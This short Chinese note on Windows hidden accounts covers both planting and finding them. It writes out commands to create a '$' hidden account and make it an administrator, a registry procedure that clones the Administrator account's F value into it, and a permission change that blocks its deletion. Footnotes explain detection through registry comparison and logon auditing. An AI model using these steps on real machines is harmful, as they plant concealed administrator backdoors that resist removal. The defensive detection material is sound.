### 添加 `$`符号型隐藏账户

- `net user hidden$ 123456 /add`

### 隐藏账户提升为管理员权限

- `net localgroup administrators hidden$ /add`

### 查看系统账户

- `net user` [^1]

### 显示全部系统账号

- `net localgroup administrators` [^2]

- `compmgmt.msc` -> 本地用户和组 -> 用户

### 注册表型隐藏账户

- `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names` [^3]

### 获取无法看到名称的隐藏账户 [^4]

- `gpedit.msc` -> 计算机配置  -> Windows设置 -> 安全设置  ->  本地策略  -> 审核策略
- 审核策略更改、审核登录事件、审核进程跟踪 -> 成功 [^5]

### 将隐藏账户替换为管理员

1. 查看`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\hidden$` 中的类型值  `0x3fa`
2. 根据 `0x3fa`定位到 `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003FA`并导出
3. 同理导出 `Administrator`账户对应的 `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4`
4. 使用编辑器替换注册表文件中的 ==F== 字段的值
5. `net user hidden$ /del` 删除 `hidden$` 账户
6. 将修改过得注册表文件导入

### 切断删除隐藏账户的途径

- 修改 `HKEY_LOCAL_MACHINE\SAM\SAM`处的`Administrator`的权限

[原文](http://www.chncto.com/safe-Knowledge/22349.html)

---

[^1]: 显示当前系统中存在的账户，但不会显示 `hidden$`账号
[^2]: 一般建立完隐藏账户后会把隐藏账户提升为管理员权限
[^3]: 把这里存在的账户和“计算机管理”中存在的账户进行比较，多出来的账户就是隐藏账户。想要删除它就直接删除以隐藏账户命名的项即可
[^4]: 情况背景是入侵者制作了一个修改注册表型隐藏账户，同时删除了管理员对注册表的操作权限。那么管理员是无法通过注册表删除隐藏账户，甚至无法知道黑客建立的隐藏账户名称
[^5]: 进行登陆审核后可以对任何账户的登陆操作进行记录，包括隐藏账户，这样我们就可以通过“计算机管理”中的“事件查看器”准确得知隐藏账户的名称，甚至入侵者登陆的时间。一旦找到账户名可以使用 `net user 隐藏账户名称 654321` 更改这个隐藏账户的密码使这个隐藏账户远程登录失效